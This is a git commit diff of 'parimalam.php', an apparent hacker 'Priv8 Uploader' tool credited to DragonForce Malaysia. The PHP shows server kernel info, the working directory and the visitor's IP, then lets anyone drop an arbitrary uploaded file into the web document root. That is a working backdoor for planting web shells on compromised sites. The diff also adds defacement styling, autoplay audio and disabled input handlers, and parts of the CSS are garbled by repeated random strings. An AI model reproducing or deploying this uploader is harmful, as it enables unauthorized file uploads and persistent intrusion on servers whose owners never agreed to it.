a419ec00047703429c14e23d88f169d579b10bbc
SurpriseMTFK <25004320+SurpriseMTFK@users.noreply.github.com>
2022-09-27 01:58:40 +0800

    Update parimalam.php

--- Uploaders-Collection/parimalam.php
+++ Uploaders-Collection/parimalam.php
@@ -1,26 +1,49 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
+<!DOCTYPE html>
+<html lang="en">
+    <title>Supp Bruhh?</title>
 <head>
-	<meta charset="UTF-8">
-	<title>Supp Bruhh?</title>
-</head>
-<body background="http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg">
-<body>
-<script>
-    </script>
+
+        <link rel="icon" type="image/png" href="https://mambang-edge.dragonforce.io/data/assets/logo/32x32-01.png" sizes="32x32" />
+        <link rel="apple-touch-icon" href="https://mambang-edge.dragonforce.io/data/assets/logo/maskable_icon_x192.png">
+        <meta property="og:site_name" content="Dragon Force Malaysia" />
+        <meta property="og:title" content="Pari Malam" />
+        <meta property="og:description" content="w00t! w00t!">  
+        <meta property="og:image" content="https://cancerinfotw.org/images/tikus-1.gif.mp4">
+        <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+        <meta name="keywords" content="DragonForce Malaysia" />
+        <meta name="author" content="Pari Malam" />
+        <meta name='rating' content='general' />
+        <meta name='geo.country' content='id' />
+        <meta name='geo.placename' content='Malaysia' />
+        <meta name='robots' content='all'/>
+        <meta name='robots' content='index, follow' />
+        <meta name='robots schedule' content='auto'/>
+        <meta name='revisit-after' content='1 days' />
+        <meta name='googlebot' content='index,follow'/>
+        <meta name='distribution' content='global'/>
+        <meta content='IE=edge,chrome=1' http-equiv='X-UA-Compatible'/>
+
+
+<style type="text/css">
+html {
+	text-align: center;
+}
+a {
+	text-decoration: none;
+	color: white;
+}
 </style>
-
-<center><br><img src="https://i.imgflip.com/4jvo28.gif" width="820" height="312"><center>
-
-<font face= "Architects Daughter">
-<font color='red' face='Architects Daughter' font size="5px"'>- DragonForce Malaysia - <br>- Priv8 Uploaders By Pari Malam -</font></b><center>
+<body bgcolor="black">
+<center><br><img src="https://mambang-edge.dragonforce.io/data/assets/logo/maskable_icon_x192.png" width="250" height="250"><center><br>
+<font face= "Courier New">
+<font color='red' face='Courier New' font size="4px">Priv8 Uploaders By Pari Malam</font></b><center><br>
 <?php
-echo '<big><font color=white> System: <span style="color: lime;">'.php_uname().'</span></big><br>';
-echo "<font color=white>Your Noob IP Address: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
-echo '<big><font color=white>Directory: <span style="color: aqua;">'.getcwd().'</span></big><br><br>';
+echo '<big><font color="white" size="4px"> Kernel: <span style="color: yellow;">'.php_uname().'</font></span></big><br>';
+echo '<big><font color="white" size="4px"> Directory: <span style="color: yellow;">'.getcwd().'</font></span></big><br>';
+echo "<big><font color='white' size='4px'> Ur Noob IP Address: <span style='color: yellow;'>".$_SERVER['REMOTE_ADDR']."</big></font><br><br>";
 echo "<form method='post' enctype='multipart/form-data'>
 	  <input type='file' name='just_file'>
-	  <input type='submit' name='upload' value='Upload!'>
+	  <input type='submit' name='upload' value='w00t!'>
 	  </form>
 	  </center>";
 $root = $_SERVER['DOCUMENT_ROOT'];
@@ -30,13 +53,13 @@ if(isset($_POST['upload'])) {
 	if(is_writable($root)) {
 		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
 			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "<font color='lime'Fuckedz => <a href='$web$files' target='_blank'><br><b><u>$web/$files</u></b></a></br>";
+			echo "<font color='lime'w00t! => <a href='$web$files' target='_blank'><br><b><u>$web/$files</u></b></a></br>";
 		} else {
 			echo "<font color='red'Failed!";
 		}
 	} else {
 		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
-			echo " Fuckedz <b>$files</b> Here!";
+			echo "w00t! => <b>$files</b>";
 		} else {
 			echo "Failed!";
 		}
@@ -45,8 +68,8 @@ if(isset($_POST['upload'])) {
 ?>
 </body>
 <br>
-<br>
-<br>
-<style> .error { text-align: center; font-family: 'Gilda Display', serif; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; overflow: default; } .info { text-align: center; width: 200px; height: 60px; margin: auto; position: absolute; top: 280px; bottom: 0; left: 20px; right: 0; -webkit-animation: noise-3 1s linear infinite; animation: noise-3 1s linear infinite; } .info:after { content: 'OWNED'; font-family: OCR-A; font-size: 100px; text-align: center; width: 800px; margin: auto; position: absolute; top: 20px; bottom: 0; left: 40px; right: 0; opacity: 0; color: white; -webkit-animation: noise-1 .2s linear infinite; animation: noise-1 .2s linear infinite; } @-webkit-keyframes noise-1 { 0%, 20%, 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12: .3;} 100% {opacity: .6; left: 2px;} } @keyframes noise-1 { 0%, 20%, 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12: .3;} 100% {opacity: .6; left: 2px;} } @-webkit-keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @-webkit-keyframes noise { 0%, 3%, 5%, 42%, 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT120%, 3%, 5%, 42%, 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12webkit-transform: scaleY(1.7); transform: scaleY(1.7);} 4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12noise-3 { 0%,3%,5%,4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } @keyframes noise-3 { 0%,3%,5%,4AqLHHmtMTQRWomEbPd8yxFdEsZ5VMXy1MvwhG1TTWgcCbGzgaAcfkA54K45UbQXjtBa3UYhmr8vYaGNGAkVTfXCE5bbT12; -webkit-transform: scaleY(4); transform: scaleY(4);} 43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate (60deg);} } .wrap { top: 30%; left: 25%; height: 200px; margin-top: -100px; position: absolute; } code { color: white; } span.blue { color: #48beef; } span.comment { color: #7f8c8d; } span.orange { color: #f39c12; } span.green { color: #33cc33; } .viewFull { font-family:OCR-A; color:orange; text-decoration:; } 	 } @media only screen and (min-height: 500px) { .viewFull{ display:none; 	 	} } 	</style> <center> <style> img { filter:alpha(opacity=70); -moz-opacity:0.7; opacity:0.7; } img:hover { filter:alpha(opacity=100); -moz-opacity:.0; opacity:1.0; } </style> 
-</body>
+<body style="background-image: url('http://37.media.tumblr.com/tumblr_lnsltuqkgo1qfn9vko1_500.gif'); background-repeat: no-repeat; background-size: 100% 100%; background-position: center; background-attachment: fixed; oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body">
+<video autoplay loop allowscriptaccess='always' allowfullscreen='false' width='1' height='0' >
+<audio src="http://cancerinfotw.org/images/liyakun.mp3" autoplay="true" id="lagu" loop=""></audio>
+
 </html>
